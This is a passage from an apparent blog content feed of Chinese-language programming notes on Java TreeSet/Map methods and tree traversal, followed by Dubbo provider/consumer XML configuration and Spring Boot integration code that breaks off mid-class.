rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong>[<code>subSet</code>](<a href="https://jdk6.net/util/TreeSet.html#subSet" target="_blank" rel="noopener">https://jdk6.net/util/TreeSet.html#subSet</a>(E, E))<code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>fromElement,</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>toElement)</code>      返回此 set 的部分视图，其元素从 fromElement（包括）到 toElement（不包括）。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/SortedSet.html" target="_blank" rel="noopener"><code>SortedSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong><a href="https://jdk6.net/util/TreeSet.html#tailSet(E)" target="_blank" rel="noopener"><code>tailSet</code></a><code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>fromElement)</code>      返回此 set 的部分视图，其元素大于等于 fromElement。</strong></td></tr><tr><td align="left"><strong><code></code><a href="https://jdk6.net/util/NavigableSet.html" target="_blank" rel="noopener"><code>NavigableSet</code></a><code>&lt;</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>&gt;</code></strong></td><td align="left"><strong>[<code>tailSet</code>](<a href="https://jdk6.net/util/TreeSet.html#tailSet" target="_blank" rel="noopener">https://jdk6.net/util/TreeSet.html#tailSet</a>(E, boolean))<code>(</code><a href="https://jdk6.net/util/TreeSet.html" target="_blank" rel="noopener"><code>E</code></a><code>fromElement, boolean inclusive)</code>      返回此 set 的部分视图，其元素大于（或等于，如果 <code>inclusive</code> 为 true）<code>fromElement</code>。</strong></td></tr></tbody></table><h5 id="3-1-4TreeSet底层原理"><a href="#3-1-4TreeSet底层原理" class="headerlink" title="3.1.4TreeSet底层原理"></a><strong>3.1.4TreeSet底层原理</strong></h5><p>TreeSet/TreeMap底层都采用的是自平衡二叉树(TreeSet底层是TreeMap): 遵循左小右大的原则存放，存放的过程也就是排序的过程</p><p>遍历二叉树的三种方式: (note:左永远在右的左边)</p><p><strong>前序遍历</strong>: 根左右</p><p><strong>中序遍历</strong>:左根右 (满足自平衡二叉树的存放方式，中序遍历取出数据的时候就为自动排序好的数据)</p><p><strong>后序遍历</strong>:左右根</p><p>TreeSet/TreeMap集合采用的是：中序遍历</p><p>二叉树的遍历均可以看成是递归的过程，也就是将一个树不断的划分成左子树、根、右子树的过程，直到不能再划分成一个子树</p><h4 id="4-1Map集合"><a href="#4-1Map集合" class="headerlink" title="4.1Map集合"></a><strong>4.1Map集合</strong></h4><p>Map接口储存一组成对的键-值对象，提供<strong>key</strong>（键）到<strong>value</strong>（值）的<strong>映射</strong>，Map中的key<strong>不要求有序</strong>，<strong>不允许重复</strong>。value同样<strong>不要求有序</strong>，<strong>但可以重复</strong>。</p><h5 id="4-1-1常用方法"><a href="#4-1-1常用方法" class="headerlink" title="4.1.1常用方法"></a><strong>4.1.1常用方法</strong></h5><table><thead><tr><th align="left"><strong>返回类型</strong></th><th align="left"><strong>介绍</strong></th></tr></thead><tbody><tr><td align="left">void</td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#clear()" target="_blank" rel="noopener"><code>clear</code></a></strong><code>()</code>      从此映射中移除所有映射关系（可选操作）</td></tr><tr><td align="left"><code>boolean</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#containsKey(java.lang.Object)" target="_blank" rel="noopener"><code>containsKey</code></a></strong><code>(</code><a href="https://jdk6.net/lang/Object.html" target="_blank" rel="noopener"><code>Object</code></a><code>key)</code>      如果此映射包含指定键的映射关系，则返回 true。</td></tr><tr><td align="left"><code>boolean</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#containsValue(java.lang.Object)" target="_blank" rel="noopener"><code>containsValue</code></a></strong><code>(</code><a href="https://jdk6.net/lang/Object.html" target="_blank" rel="noopener"><code>Object</code></a><code>value)</code>      如果此映射将一个或多个键映射到指定值，则返回 true。</td></tr><tr><td align="left"><code></code><a href="https://jdk6.net/util/Set.html" target="_blank" rel="noopener"><code>Set</code></a><code>&lt;</code><a href="https://jdk6.net/util/Map-Entry.html" target="_blank" rel="noopener"><code>Map.Entry</code></a><code>&lt;</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>K</code></a><code>,</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>V</code></a><code>&gt;&gt;</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#entrySet()" target="_blank" rel="noopener"><code>entrySet</code></a></strong><code>()</code>      返回此映射中包含的映射关系的 <a href="https://jdk6.net/util/Set.html" target="_blank" rel="noopener"><code>Set</code></a> 视图。</td></tr><tr><td align="left"><code>boolean</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#equals(java.lang.Object)" target="_blank" rel="noopener"><code>equals</code></a></strong><code>(</code><a href="https://jdk6.net/lang/Object.html" target="_blank" rel="noopener"><code>Object</code></a><code>o)</code>      比较指定的对象与此映射是否相等。</td></tr><tr><td align="left"><code></code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>V</code></a></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#get(java.lang.Object)" target="_blank" rel="noopener"><code>get</code></a></strong><code>(</code><a href="https://jdk6.net/lang/Object.html" target="_blank" rel="noopener"><code>Object</code></a><code>key)</code>      返回指定键所映射的值；如果此映射不包含该键的映射关系，则返回 <code>null</code>。</td></tr><tr><td align="left"><code>int</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#hashCode()" target="_blank" rel="noopener"><code>hashCode</code></a></strong><code>()</code>      返回此映射的哈希码值。</td></tr><tr><td align="left"><code>boolean</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#isEmpty()" target="_blank" rel="noopener"><code>isEmpty</code></a></strong><code>()</code>      如果此映射未包含键-值映射关系，则返回 true。</td></tr><tr><td align="left"><code></code><a href="https://jdk6.net/util/Set.html" target="_blank" rel="noopener"><code>Set</code></a><code>&lt;</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>K</code></a><code>&gt;</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#keySet()" target="_blank" rel="noopener"><code>keySet</code></a></strong><code>()</code>      返回此映射中包含的键的 <a href="https://jdk6.net/util/Set.html" target="_blank" rel="noopener"><code>Set</code></a> 视图。</td></tr><tr><td align="left"><code></code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>V</code></a></td><td align="left"><strong>[<code>put</code>](<a href="https://jdk6.net/util/Map.html#put" target="_blank" rel="noopener">https://jdk6.net/util/Map.html#put</a>(K, V))</strong><code>(</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>K</code></a><code>key,</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>V</code></a><code>value)</code>      将指定的值与此映射中的指定键关联（可选操作）。</td></tr><tr><td align="left"><code>void</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#putAll(java.util.Map)" target="_blank" rel="noopener"><code>putAll</code></a></strong><code>(</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>Map</code></a><code>[</code>K<code>](https://jdk6.net/util/Map.html)</code>,? extends <code>[</code>V<code>](https://jdk6.net/util/Map.html)</code>&gt; m)`      从指定映射中将所有映射关系复制到此映射中（可选操作）。</td></tr><tr><td align="left"><code></code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>V</code></a></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#remove(java.lang.Object)" target="_blank" rel="noopener"><code>remove</code></a></strong><code>(</code><a href="https://jdk6.net/lang/Object.html" target="_blank" rel="noopener"><code>Object</code></a><code>key)</code>      如果存在一个键的映射关系，则将其从此映射中移除（可选操作）。</td></tr><tr><td align="left"><code>int</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#size()" target="_blank" rel="noopener"><code>size</code></a></strong><code>()</code>      返回此映射中的键-值映射关系数。</td></tr><tr><td align="left"><code></code><a href="https://jdk6.net/util/Collection.html" target="_blank" rel="noopener"><code>Collection</code></a><code>&lt;</code><a href="https://jdk6.net/util/Map.html" target="_blank" rel="noopener"><code>V</code></a><code>&gt;</code></td><td align="left"><strong><a href="https://jdk6.net/util/Map.html#values()" target="_blank" rel="noopener"><code>values</code></a></strong><code>()</code>      返回此映射中包含的值的 <a href="https://jdk6.net/util/Collection.html" target="_blank" rel="noopener"><code>Collection</code></a> 视图。</td></tr><tr><td align="left">default V replace(K key, V value)</td><td align="left">只有当目标映射到某个值时，才能替换指定键的条目l</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dubbo</title>
      <link href="/2022/03/03/dubbo/"/>
      <url>/2022/03/03/dubbo/</url>
      
        <content type="html"><![CDATA[<p>provider.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>dubbo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://code.alibabatech.com/schema/dubbo<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd        http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd        http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 1、指定当前服务/应用的名字（同样的服务名字相同，不要和别的服务同名） --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>application</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>user-service-provider<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>application</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 2、指定注册中心的位置 --></span>    <span class="token comment" spellcheck="true">&lt;!-- &lt;dubbo:registry address="zookeeper://127.0.0.1:2181">&lt;/dubbo:registry> --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>registry</span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zookeeper<span class="token punctuation">"</span></span> <span class="token attr-name">address</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>127.0.0.1:2181<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>registry</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 3、指定通信规则（通信协议？通信端口） --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>protocol</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dubbo<span class="token punctuation">"</span></span> <span class="token attr-name">port</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>20882<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>protocol</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 4、暴露服务   ref：指向服务的真正的实现对象 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>service</span> <span class="token attr-name">interface</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.UserService<span class="token punctuation">"</span></span>         <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceImpl01<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1.0.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getUserAddressList<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>method</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>service</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--统一设置服务提供方的规则  --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>provider</span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>provider</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 服务的实现 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceImpl01<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.impl.UserServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>service</span> <span class="token attr-name">interface</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.UserService<span class="token punctuation">"</span></span>         <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceImpl02<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2.0.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getUserAddressList<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>method</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>service</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceImpl02<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.impl.UserServiceImpl2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 连接dubbo监控中心 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>monitor</span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>registry<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>monitor</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>consumer.xml</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>dubbo</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://dubbo.apache.org/schema/dubbo<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.3.xsd        http://dubbo.apache.org/schema/dubbo http://dubbo.apache.org/schema/dubbo/dubbo.xsd        http://code.alibabatech.com/schema/dubbo http://code.alibabatech.com/schema/dubbo/dubbo.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.impl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>application</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>order-service-consumer<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>application</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>registry</span> <span class="token attr-name">address</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zookeeper://127.0.0.1:2181<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>registry</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--  配置本地存根--></span>    <span class="token comment" spellcheck="true">&lt;!--声明需要调用的远程服务的接口；生成远程服务代理  --></span>    <span class="token comment" spellcheck="true">&lt;!--         1）、精确优先 (方法级优先，接口级次之，全局配置再次之)        2）、消费者设置优先(如果级别一样，则消费方优先，提供方次之)    --></span>    <span class="token comment" spellcheck="true">&lt;!-- timeout="0" 默认是1000ms--></span>    <span class="token comment" spellcheck="true">&lt;!-- retries="":重试次数，不包含第一次调用，0代表不重试--></span>    <span class="token comment" spellcheck="true">&lt;!-- 幂等（设置重试次数）【查询、删除、修改】、非幂等（不能设置重试次数）【新增】 --></span>    //设置多版本    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>reference</span> <span class="token attr-name">interface</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.UserService<span class="token punctuation">"</span></span>         <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userService<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5000<span class="token punctuation">"</span></span> <span class="token attr-name">retries</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>3<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>*<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- &lt;dubbo:method name="getUserAddressList" timeout="1000">&lt;/dubbo:method> --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>reference</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 配置当前消费者的统一规则：所有的服务都不检查 启动不检查 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>consumer</span> <span class="token attr-name">check</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>5000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>consumer</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>monitor</span> <span class="token attr-name">protocol</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>registry<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>monitor</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- &lt;dubbo:monitor address="127.0.0.1:7070">&lt;/dubbo:monitor> --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>时间&amp;超时覆盖关系</p><p>stud设置本地存根，可以加以验证，避免多次条用rpc，提高性能</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>service</span> <span class="token attr-name">interface</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.UserService<span class="token punctuation">"</span></span>         <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userServiceImpl02<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2.0.0<span class="token punctuation">"</span></span> <span class="token attr-name">stub</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.gmall.service.impl.UserServiceStub<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">dubbo:</span>method</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getUserAddressList<span class="token punctuation">"</span></span> <span class="token attr-name">timeout</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1000<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">dubbo:</span>method</span><span class="token punctuation">></span></span></code></pre><p>springboot配置dubbo的几种方式</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">/** * 1、导入依赖； *         1）、导入dubbo-starter *         2）、导入dubbo的其他依赖 * @author lfy * * SpringBoot与dubbo整合的三种方式： * 1）、导入dubbo-starter，在application.properties配置属性，使用@Service【暴露服务】使用@Reference【引用服务】 * 2）、保留dubbo xml配置文件; *         导入dubbo-starter，使用@ImportResource导入dubbo的配置文件即可 * 3）、使用注解API的方式： *         将每一个组件手动创建到容器中,让dubbo来扫描其他的组件 */</span><span class="token comment" spellcheck="true">//@EnableDubbo //开启基于注解的dubbo功能</span><span class="token comment" spellcheck="true">//@ImportResource(locations="classpath:provider.xml")</span><span class="token annotation punctuation">@EnableDubbo</span><span class="token punctuation">(</span>scanBasePackages<span class="token operator">=</span><span class="token string">"com.atguigu.gmall"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@EnableHystrix</span> <span class="token comment" spellcheck="true">//开启服务容错</span><span class="token annotation punctuation">@SpringBootApplication</span></code></pre><p>application.properties</p><pre class=" language-xml"><code class="language-xml">#dubbo.application.name=user-service-provider#dubbo.registry.address=127.0.0.1:2181#dubbo.registry.protocol=zookeeper##dubbo.protocol.name=dubbo##dubbo.protocol.port=20881##dubbo.monitor.protocol=registry##dubbo.scan.base-packages=com.atguigu.gmall</code></pre><p>MyDubboConfig配置方式</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>gmall<span class="token punctuation">.</span>config<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>ArrayList<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Bean<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>Configuration<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>ApplicationConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>MethodConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>MonitorConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>ProtocolConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>ProviderConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>RegistryConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>dubbo<span class="token punctuation">.</span>config<span class="token punctuation">.</span>ServiceConfig<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>gmall<span class="token punctuation">.</span>service<span class="token punctuation">.</span>UserService<span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyDubboConfig</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> ApplicationConfig <span class="token function">applicationConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ApplicationConfig applicationConfig <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ApplicationConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        applicationConfig<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"boot-user-service-provider"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> applicationConfig<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//&lt;dubbo:registry 